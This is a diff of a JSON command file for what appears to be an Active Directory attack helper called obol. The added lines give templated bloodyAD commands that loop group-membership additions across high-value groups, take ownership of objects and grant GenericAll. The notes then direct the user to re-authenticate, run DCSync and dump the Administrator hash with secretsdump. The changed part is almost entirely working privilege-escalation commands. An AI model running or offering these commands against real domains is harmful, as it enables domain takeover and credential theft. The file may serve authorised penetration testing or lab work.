@@ -1747,17 +1747,22 @@
     },
     {
      "tool": "bloodyad",
-     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
-     "note": "A group-write edge: add yourself (or an account you control) to the target group. Log in again or refresh your ticket for it to apply."
+     "run": "for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"$g\" {{user}} 2>/dev/null && echo \"[+] JOINED: $g\"; done",
+     "note": "Fire on every reasonable group at once — obol fills the list with the high-value groups you can write to (or the usual suspects when the lead is thin), so you don't have to guess which one is the path. Any line that prints '[+] JOINED' is a group you now belong to; RE-AUTHENTICATE (fresh login / new ticket), then run the `add dcsync` card — a membership like Exchange Windows Permissions grants WriteDACL over the domain object, which is what makes DCSync stick. Paste the whole output back here and obol records each group you joined."
     },
     {
      "tool": "bloodyad",
-     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner {{target_sam}} {{user}}",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
+     "note": "The winning add: obol fills {{group}} with the highest-value group you can write to — a group whose membership hands you domain control (e.g. Exchange Windows Permissions → WriteDACL over the domain → DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
      "note": "A WriteOwner edge: take ownership of the object..."
     },
     {
      "tool": "bloodyad",
-     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll {{target_sam}} {{user}}",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
      "note": "...then award yourself GenericAll. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials."
     },
     {
